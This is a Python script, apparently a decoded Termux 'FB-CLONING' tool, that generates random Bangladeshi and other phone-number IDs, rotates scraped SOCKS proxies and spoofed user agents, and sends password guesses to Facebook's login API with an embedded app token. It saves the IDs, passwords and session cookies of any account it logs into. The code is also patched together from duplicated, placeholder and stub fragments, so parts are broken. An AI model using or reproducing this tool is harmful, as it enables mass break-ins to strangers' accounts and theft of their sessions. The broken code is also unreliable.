# GITHUB LINK : SKBER-CYBER
# DECODE BY : MUHAMMAD JAKARIYA HASAN
import os
import time
import random
import string
import re
import sys
import requests
import json
import uuid
from mechanize import Browser
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
B = "Some constant value"
R = "Another constant"
G = "Yet another constant"
H = "More constants"
BL = "Black"
BG = "Blue"
S = "Some string"
W = "White"
EX = "Example"
E = "Error"
LIMITX = 100  # Example limit
CPG = "Some other constant"
CKIG = "Yet another constant"
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def now():
    return datetime.now()
def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()
def write_file(file_path, data):
    with open(file_path, 'w') as file:
        file.write(data)
def generate_uuid():
    return str(uuid.uuid4())
def make_get_request(url, proxies=None):
    try:
        response = requests.get(url, proxies=proxies)
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None
def main():
    clear()
    print("Welcome to the program!")
    print(f"Current time: {now()}")
    lines = read_file('example.txt')
    for line in lines:
        print(line)
    write_file('output.txt', "This is an output file.")
    print(f"Generated UUID: {generate_uuid()}")
    url = "http://example.com"
    response = make_get_request(url)
    if response:
        print("Response from GET request:")
        print(response)
def generate_user_agent():
    poco_models = [
        'Poco F1',
        'Poco X3 NFC',
        'Poco M3',
        'Poco F2 Pro',
        'Poco X4 Pro',
        'Poco M4 Pro']    
    user_agent = (
        f"[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0."
        f"{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};"
        f"FBDM/{{density=2.0,width=1080,height=2400}};FBLC/en_US;FBRV/"
        f"{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/Xiaomi;"
        f"FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/"
        f";FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]") 
    return user_agent
def clear():
    os.system('clear')  
    print(logo) 
if __name__ == "__main__":
    logo = "Your Logo Here" 
    clear()
    user_agent = generate_user_agent()
    print(user_agent)

import os
import requests

def install_packages():
    os.system('pkg install sox -y')
    os.system('pkg install espeak')

def clear_terminal():
    os.system('clear')

def speak_message(message):
    os.system(f'espeak -a 300 "{message}"')

def fetch_proxies():
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all"
    response = requests.get(url)
    if response.status_code == 200:
        with open('socksku.txt', 'w') as file:
            file.write(response.text)
    else:
        print("Failed to fetch proxies")

def main():
    install_packages()
    clear_terminal()
    speak_message("well,come to,CYBER, King tools")
    fetch_proxies()

if __name__ == "__main__":
    main()
import time
def Main():
    while True:
        clear()
        print("\x1b[10;92m┏━\x1b[10;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m1\x1b[10;97m] \x1b[10;92mRANDOM BANGLADESH CLONER \x1b[10;97m")
        print("\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m2\x1b[10;97m] \x1b[10;93mCONTACT WITH ADMIN")
        print("\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m0\x1b[10;97m] \x1b[10;91mEXIT")
        print("\x1b[10;92m┣━\x1b[10;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("\x1b[10;92m┗━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCHOOSE \x1b[10;91m:")        
        ghx = input()
        if ghx in ('A', 'a', '1'):
            rcd.append('1')
            rmenu1()
        elif ghx in ('B', 'b', '2'):
            rcd.append('2')
            rmenu1()
        elif ghx in ('C', 'c', '3'):
            rcd.append('3')
            rmenu1()
        elif ghx in ('C', 'c', '4'):
            rcd.append('4')
            rmenu1()
        else:
            line()
            print("\tChoose Valid Option")
            time.sleep(1)
            Main()
def clear():    
    pass
def rmenu1():
    pass
def line():
    pass
from concurrent.futures import ThreadPoolExecutor
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def print_banner():
    print('\x1b[10;92mAdmin Facebook idz')
    print('xdg-open https://t.me/ZERO_CYBER_TEM')
    print("===============================================")
def random_string(length=8):
    return ''.join(random.choice(string.digits) for _ in range(length))
def worker_thread(id):
    print(f"Processing task {id}...")
    time.sleep(2)
    print(f"Task {id} complete.")

def main():
    clear()
    print_banner()
    LIMITX = 10
    thread_pool = ThreadPoolExecutor(max_workers=LIMITX)    
    tasks = []
    for i in range(LIMITX):
        tasks.append(thread_pool.submit(worker_thread, i))
    for task in tasks:
        task.result()
import random
import string
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import os
import time
def generate_random_id(length=8):
    """Generate a random ID consisting of digits."""
    return ''.join(random.choice(string.digits) for _ in range(length))

def print_header(username, total_ids, start_time):
    """Print the header information."""
    print('┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'┣━[+] USER NAME : {username}')
    print(f'┣━] YOUR TOTAL ID : {total_ids}')
    print(f'┣━[+] Started Time Date : {start_time}')
    print('┣━[+] USE YOUR AIRPLANE MODE [ON/OFF] AFTER-3 MIN')
    print('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def generate_ids(limit, username):
    """Generate a specified number of random IDs."""
    ids = []
    for _ in range(limit):
        random_id = generate_random_id()
        ids.append(random_id)
    return ids

def main():
    username = 'khan123'
    total_ids = 10  # Example total IDs to generate
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")   
    print_header(username, total_ids, start_time)
    # Use ThreadPoolExecutor to generate IDs concurrently
    with ThreadPoolExecutor(max_workers=60) as executor:
        future_ids = executor.submit(generate_ids, total_ids, username)
        generated_ids = future_ids.result()
    # Print generated IDs
    for id in generated_ids:
        print(f'Generated ID: {id}')
if __name__ == "__main__":
    main()
def graphrm(id, psd, tid):
    # Constants
    USER_AGENT = 'Dalvik/2.1.0 (Linux; U; Android 4.4.2; Build/QP1A.111111)'
    URL = 'https://b-graph.facebook.com/auth/login'
    HEADERS = {
        'User-Agent': USER_AGENT,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'X-FB-Friendly-Name': 'fb_api_req_friendly_name',
        'Content-Type': 'application/x-www-form-urlencoded'  }
    data = {
        'email': id,
        'password': psd,
        'device_id': str(uuid.uuid4()),
        'login': 'true',
        'source': 'login' }    
    try:
        response = requests.post(URL, headers=HEADERS, data=data, timeout=20)
        response.raise_for_status()       
        if 'session_key' in response.text:
            print(f'\r\r\x1b[10;92m[CYBER-Ok💚] | \x1b[10;91m•> \x1b[10;92m{id}')
            with open('/sdcard/1T-OK.txt', 'a') as f:
                f.write(f'{id}\n')
        else:
            error_message = re.findall(r'error": "(.*?)"', response.text)
            if error_message:
                print(f'\r\r\x1b[10;91m[Error] {error_message[0]}')
                with open('/sdcard/1T-2F.txt', 'a') as f:
                    f.write(f'{id}\n')
            else:
                print('\r\r\x1b[10;91m[Unknown Error]')   
    except requests.exceptions.RequestException as e:
        print(f'\r\r\x1b[10;91m[Request Error] {str(e)}')
def generate_user_agent():
    vchrome = f"{random.randint(100, 925)}.0.0.{random.randint(1, 8)}.{random.randint(40, 150)}"
    gtt = random.choice(['some_value1', 'some_value2'])  # Replace with actual values
    gttt = random.choice(['some_value3', 'some_value4'])  # Replace with actual values
    ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {gtt} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) [FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{{density=3.3,width=1080,height=1430}};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    return ua
def create_data(id, psw):
    datax = {
        'adid': str(uuid.uuid4()),
        'format': 'json',
        'device_id': str(uuid.uuid4()),
        'email': id,
        'password': psw,
        'generate_analytics_claims': '1',
        'community_id': '',
        'cpl': 'true',
        'try_num': '1',
        'family_device_id': str(uuid.uuid4()),
        'credentials_type': 'password',
        'source': 'login',
        'error_detail_type': 'button_with_disabled',
        'enroll_misauth': 'false',
        'generate_session_cookies': '1',
        'generate_machine_id': '1',
        'currently_logged_in_userid': '0',
        'GB': 'authenticate',
        'fb_api_req_friendly_name': ('en_GB',)
    }
    return datax
def login(id, psw):
    ua = generate_user_agent()
    datax = create_data(id, psw)
    headers = {
        'User-Agent': ua,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'X-FB-Friendly-Name': 'authenticate',
        'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
        'X-FB-Connection-Type': 'unknown',
        'Content-Type': 'application/x-www-form-urlencoded'
    }    
    response = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=headers)
    lo = response.json()   
    if 'session_key' in lo:
        cki = lo['session_cookies']
        ck = {}
        for xk in cki:
            ck[xk['name']] = xk['value']       
        coki = '; '.join([f"{key}={value}" for key, value in ck.items()])
        iid = re.findall(r'c_user=(.*?);xs', coki)[0]       
        print(f'\r\r\x1b[10;92m[CYBER-Ok💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m')
        os.system('espeak -a 300 "CYBER,  Ok,  id"')        
        with open('/sdcard/1T-OK.txt', 'a') as f:
            f.write(f"{iid} | {psw} | {id}  ------------>>>{coki}\n")        
        return coki
    else:
        print("Login failed.")
        return None
id = "user@example.com"
psw = "password123"
login(id, psw)

import os
def main():
    cp = []  
    id = "example_id"  
    psw = "example_password"  
    iid = "example_iid"  
    file_path = '/sdcard/1T-CP.txt'  
    cp.append(iid) 
    os.system('espeak -a 300 "Cp"') 
    with open(file_path, 'a') as file:
        file.write(f"{iid} | {psw} | {id}\n")
os.system('pkg install sox -y')
os.system('pkg install espeak')
os.system('clear')
os.system('espeak -a 300 "well,come to,CYBER, King tools"')
current_time = datetime.now()
date_time_str = str(current_time)
date_time_parts = date_time_str.split(' ')
date_time = date_time_parts[0]
proxy_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all'
response = requests.get(proxy_url)
proxy_list = response.text
with open('socksku.txt', 'w') as file:
    file.write(proxy_list)
with open('socksku.txt', 'r') as file:
    proxies = file.read().splitlines()
bd_sim_code = '013 014 015 016 017 018 019'
ind_sim_code = '9670 9725 8948 8795 6383'
pak_sim_code = '0306 0315 0335 0345 0318'
print(f'[\033[10;92m+\033[10;97m] BD SIM CODE: {bd_sim_code}')
print(f'[\033[10;92m+\033[10;97m] IND SIM CODE: {ind_sim_code}')
print(f'[\033[10;92m+\033[10;97m] PAK SIM CODE: {pak_sim_code}')
limits = [1000, 5000, 10000, 15000, 20000]
limit_str = '[' + ', '.join(map(str, limits)) + ']'
print(f'[\033[10;92m+\033[10;97m] LIMITS: {limit_str}')
show_cp_account = input('[\033[10;92m+\033[10;97m] Do You Want to Show Cp Account (y/n)? ')
show_cookie = input('[\033[10;92m+\033[10;97m] Do You Want to Show Cookie (y/n)? ')
file_path = input('[\033[10;92m+\033[10;97m] PUT FILE PATH: ')
print('EXAMPLE: first123, last123, firstlast, name')
print('[\033[10;92m+\033[10;97m] METHOD [1], METHOD [2], METHOD [3]')
method = input('Choose a method: ')
logo = '''
   \x1b[38;5;196m ██████ \x1b[33;1m██    ██ \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██████  
   \x1b[38;5;196m██       \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ 
   \x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████  
   \x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ 
   \x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██ 
'''
print(logo)
print('[\x1b[1;92mDEVELOPER\x1b[1;91m] : SHOHAK-KHAN')
print('[\x1b[1;92mFACEBOOK\x1b[1;91m] : TERMUX-KING.0.3')
print('[\x1b[1;92mTOOL TYPE\x1b[1;91m] : FREE')
print('[\x1b[1;92mTOOL\x1b[1;91m] : FB-CLONING')
